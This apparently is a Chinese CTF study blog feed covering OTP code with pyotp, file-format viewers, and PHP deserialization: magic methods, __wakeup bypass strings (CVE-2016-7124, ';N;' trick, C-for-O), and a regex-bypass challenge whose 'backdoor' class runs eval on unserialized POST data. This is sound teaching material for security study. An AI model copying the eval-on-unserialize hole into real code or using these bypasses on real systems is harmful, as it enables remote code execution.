<p>一次性密码（One Time Password，简称 OTP），又称 “一次性口令”，是指只能使用一次的密码。</p>
<p>OTP 的密钥是以 base32 的方式存储的</p>
<p>python中有一个<a href="https://pypi.org/project/pyotp/">pyotp库</a>可以处理它</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Time-based OTPs</span><br><span class="hljs-keyword">import</span> pyotp<br><span class="hljs-keyword">import</span> time<br><br>totp = pyotp.TOTP(<span class="hljs-string">&#x27;base32secret3232&#x27;</span>)<br>totp.now() <span class="hljs-comment"># =&gt; &#x27;492039&#x27;</span><br><br><br>totp.verify(<span class="hljs-string">&#x27;492039&#x27;</span>) <span class="hljs-comment"># =&gt; True</span><br>time.sleep(<span class="hljs-number">30</span>)<br>totp.verify(<span class="hljs-string">&#x27;492039&#x27;</span>) <span class="hljs-comment"># =&gt; False</span><br><br><br><span class="hljs-comment">#Counter-based OTPs</span><br><span class="hljs-keyword">import</span> pyotp<br><br>hotp = pyotp.HOTP(<span class="hljs-string">&#x27;base32secret3232&#x27;</span>)<br>hotp.at(<span class="hljs-number">0</span>) <span class="hljs-comment"># =&gt; &#x27;260182&#x27;</span><br>hotp.at(<span class="hljs-number">1</span>) <span class="hljs-comment"># =&gt; &#x27;055283&#x27;</span><br>hotp.at(<span class="hljs-number">1401</span>) <span class="hljs-comment"># =&gt; &#x27;316439&#x27;</span><br><br>hotp.verify(<span class="hljs-string">&#x27;316439&#x27;</span>, <span class="hljs-number">1401</span>) <span class="hljs-comment"># =&gt; True</span><br>hotp.verify(<span class="hljs-string">&#x27;316439&#x27;</span>, <span class="hljs-number">1402</span>) <span class="hljs-comment"># =&gt; False</span><br><br><br><br><span class="hljs-comment">#Generating a Secret Key</span><br>pyotp.random_base32()<br>pyotp.random_hex()<br></code></pre></td></tr></table></figure>

<h2 id="0x10-数控打印"><a href="#0x10-数控打印" class="headerlink" title="0x10 数控打印"></a>0x10 数控打印</h2><p>遇到<code>*.gcode</code>文件或者<code>3D打印gcode的命令</code>可以放到下面这两个网站解析</p>
<p><a href="https://ncviewer.com/">ncviewer</a><br><a href="https://gcode.ws/">gCodeViewer</a></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/shukong.jpg"></p>
<h2 id="0x11-Dicom图像"><a href="#0x11-Dicom图像" class="headerlink" title="0x11 Dicom图像"></a>0x11 Dicom图像</h2><p>x光图像</p>
<p>后缀为<code>.dcm</code>的文件可以使用<code>MicroDicom</code>打开</p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>misc</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>python反序列化</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4415af594e9c21a7589996feb038f01d1e61bf7e7195157852ca3073ed29082c">c37edc3dc388221caed397fda20028d383bad53d282121946cc4fe32663762cf</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>反序列化</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()： 在创建对象时候初始化对象，一般用于对变量赋初值。<br><span class="hljs-title function_ invoke__">__destruct</span>()： 和构造函数相反，当对象所在函数调用完毕后执行。<br><span class="hljs-title function_ invoke__">__call</span>()： 当调用对象中不存在的方法会自动调用该方法。<br><span class="hljs-title function_ invoke__">__get</span>()： 获取对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__set</span>()： 设置对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__toString</span>()： 当对象被当做一个字符串使用时调用。<br><span class="hljs-title function_ invoke__">__sleep</span>()： 序列化对象之前就调用此方法(其返回需要一个数组)<br><span class="hljs-title function_ invoke__">__wakeup</span>()： 反序列化恢复对象之前调用该方法<br><span class="hljs-title function_ invoke__">__isset</span>()： 在不可访问的属性上调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()触发<br><span class="hljs-title function_ invoke__">__unset</span>()： 在不可访问的属性上使用<span class="hljs-keyword">unset</span>()时触发<br><span class="hljs-title function_ invoke__">__invoke</span>()： 将对象当作函数来使用时执行此方法<br></code></pre></td></tr></table></figure>

<h2 id="construct-amp-destruct"><a href="#construct-amp-destruct" class="headerlink" title="__construct &amp; __destruct"></a>__construct &amp; __destruct</h2><p><code>__construct</code>：在实例化一个对象时，会被自动调用，可以作为非public权限属性的初始化<br><code>__destruct</code>：和构造函数相反，当对象销毁时会调用此方法，一是用户主动销毁对象，二是当程序结束时由引擎自动销毁</p>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct\n&quot;</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;--------------------\n&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__construct<br>__destruct<br>abc<br>--------------------<br>__construct<br>abc<br>__destruct<br></code></pre></td></tr></table></figure>

<h2 id="sleep-amp-wakeup"><a href="#sleep-amp-wakeup" class="headerlink" title="__sleep &amp; __wakeup"></a>__sleep &amp; __wakeup</h2><p><code>__sleep</code>：序列化时自动调用<br><code>__wakeup</code>：反序列化时自动调用</p>
<blockquote>
<p>如果类中同时定义了 __unserialize()和__wakeup() 两个魔术方法，<br>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</p>
</blockquote>
<blockquote>
<p>同理，如果类中同时定义了 __serialize()和 __sleep() 两个魔术方法，<br>则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep\n&quot;</span>;<br>		<span class="hljs-keyword">return</span> [username,password]; <span class="hljs-comment">//需要返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误</span><br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup\n&quot;</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;user&#x27;</span>;<br>	&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;-----------------------------\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>));<br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__construct<br>__sleep<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;&#125;<br>-----------------------------<br>__wakeup<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>#2 (2) </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;user&quot;</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;admin888&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="call-amp-callstatic"><a href="#call-amp-callstatic" class="headerlink" title="__call &amp; __callstatic"></a>__call &amp; __callstatic</h2><p><code>__call</code>：对象执行类不存在的方法时会自动调用<code>__call</code>方法<br><code>__callstatic</code>：直接执行类不存在的方法时会自动调用<code>__callstatic</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__call)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>	&#125;<br><br>		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callstatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__callstatic)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">lewiserii</span>();<br>test::<span class="hljs-title function_ invoke__">lewiserii</span>();<br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">不存在lewiserii方法(__call)<br>不存在lewiserii方法(__callstatic)<br></code></pre></td></tr></table></figure>

<h2 id="get-amp-set"><a href="#get-amp-set" class="headerlink" title="__get &amp; __set"></a>__get &amp; __set</h2><p><code>__get</code>：对不可访问属性或不存在属性进行 访问引用时自动调用<br><code>__set</code>：对不可访问属性或不存在属性进行 写入时自动调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get\n&quot;</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set\n&quot;</span>;<br>	&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;password;<br><span class="hljs-variable">$a</span>-&gt;password=<span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__get<br>__set<br></code></pre></td></tr></table></figure>



<h2 id="isset-amp-unset"><a href="#isset-amp-unset" class="headerlink" title="__isset &amp; __unset"></a>__isset &amp; __unset</h2><p><code>__isset</code>：在不可访问的属性上使用<code>inset()</code>时触发<br><code>__unset</code>：在不可访问的属性上使用<code>unset()</code>时触发</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__isset\n&quot;</span>;<br>	&#125;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__unset\n&quot;</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>-&gt;password);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>-&gt;psd);<br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__isset<br>__unset<br></code></pre></td></tr></table></figure>

<h2 id="tostring"><a href="#tostring" class="headerlink" title="__tostring"></a>__tostring</h2><p><code>__toString()</code>：类的实例和字符串拼接或者作为字符串引用时会自动调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;tostring&quot;</span>;<br>	&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">tostring<br></code></pre></td></tr></table></figure>



<h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p><code>__invoke()</code>：将对象当作函数来使用时调用此方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke&quot;</span>;<br>	&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__invoke<br></code></pre></td></tr></table></figure>


<h1 id="反序列化绕过的几种方法"><a href="#反序列化绕过的几种方法" class="headerlink" title="反序列化绕过的几种方法"></a>反序列化绕过的几种方法</h1><h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h2><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><blockquote>
<p>利用条件：<br>PHP5 &lt; 5.6.25<br>​PHP7 &lt; 7.0.10</p>
</blockquote>
<p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</p>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//$v = new test();</span><br><span class="hljs-comment">//echo serialize($v);</span><br><span class="hljs-comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>当执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>时会返回<code>aaa</code>，在修改对象属性个数的值，执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>会返回<code>test</code></p>
<h3 id="利用反序列化字符串报错"><a href="#利用反序列化字符串报错" class="headerlink" title="利用反序列化字符串报错"></a>利用反序列化字符串报错</h3><p>利用一个包含<code>__destruct</code>方法的类触发魔术方法可绕过<code>__wakeup</code>方法</p>
<p>例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__get(<span class="hljs-subst">$name</span>)\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__destruct\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__wakeup\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C::__destruct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;;N;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>原本应该是<code>O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;&#125;</code><br>调用顺序是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">D::<span class="hljs-variable constant_">__wakeup</span><br>C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure>

<p>添加了一个<code>;N;</code>(反序列化末尾加上<code>;任意字符;</code>)的错误结构后调用顺序就变成了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__wakeup</span><br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure>

<p>来自Article_kelp师傅的原理解释，orz：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.jpg"></p>
<h3 id="使用C代替O"><a href="#使用C代替O" class="headerlink" title="使用C代替O"></a>使用C代替O</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">a - <span class="hljs-keyword">array</span><br>b - <span class="hljs-keyword">boolean</span><br>d - <span class="hljs-keyword">double</span><br>i - <span class="hljs-keyword">integer</span><br>o - common <span class="hljs-keyword">object</span><br>r - reference<br>s - <span class="hljs-keyword">string</span><br>C - custom <span class="hljs-keyword">object</span><br>O - <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">null</span></span><br><span class="hljs-class"><span class="hljs-title">R</span> - <span class="hljs-title">pointer</span> <span class="hljs-title">reference</span></span><br><span class="hljs-class"><span class="hljs-title">U</span> - <span class="hljs-title">unicode</span> <span class="hljs-title">string</span></span><br></code></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YAje0</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=81151</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>));<br></code></pre></td></tr></table></figure>

<p>比较鸡肋，只能执行<code>construct()</code>和<code>destruct()</code>函数，无法添加任何内容</p>
<h2 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h2><h3 id="检测’O’"><a href="#检测’O’" class="headerlink" title="检测’O’"></a>检测’O’</h3><blockquote>
<p>利用条件：<br>preg_match(‘&#x2F;^O:\d+&#x2F;i’,$data)</p>
</blockquote>
<p>例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/i&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;object not allow unserialize&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>


